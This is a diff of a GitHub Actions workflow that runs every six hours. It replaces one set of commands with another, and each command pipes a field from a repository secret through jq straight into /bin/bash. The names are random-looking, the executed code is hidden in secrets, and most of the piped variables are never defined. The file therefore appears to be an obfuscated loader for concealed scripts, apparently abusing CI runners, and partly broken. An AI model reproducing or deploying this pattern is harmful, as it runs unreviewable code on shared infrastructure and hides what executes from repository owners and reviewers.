@@ -1,26 +1,21 @@
 name: zhouyiri2245
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 0/6 * * *'
-jobs:  # 11355
+    - cron: '0 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhouyiri2245
         env:
-          lfsxk987: ${{ secrets.lfsxk987 }}
+          kj126: ${{ secrets.kj126 }}
         run: |
-          echo $lfsxk987 | jq -r .nk7 | /bin/bash
-          echo $vd3908 | jq -r .iwe41924 | /bin/bash
-          echo $ye6779 | jq -r .wmc87 | /bin/bash
-          echo $cfakf72 | jq -r .i320 | /bin/bash
-          echo $qt1593 | jq -r .dof21520 | /bin/bash
-          echo $ukq34 | jq -r .xrwd381 | /bin/bash
-          echo $wtuh470 | jq -r .c62749 | /bin/bash
-          echo $qb3593 | jq -r .jvs13 | /bin/bash
-          echo $m4279 | jq -r .ph2339 | /bin/bash
-          echo $l57364 | jq -r .h54388 | /bin/bash
-          echo $pvul0 | jq -r .sbb20020 | /bin/bash
+          echo $kj126 | jq -r .o1941 | /bin/bash
+          echo $aeqko3 | jq -r .phq17659 | /bin/bash
+          echo $rvmy285 | jq -r .vpafa734 | /bin/bash
 
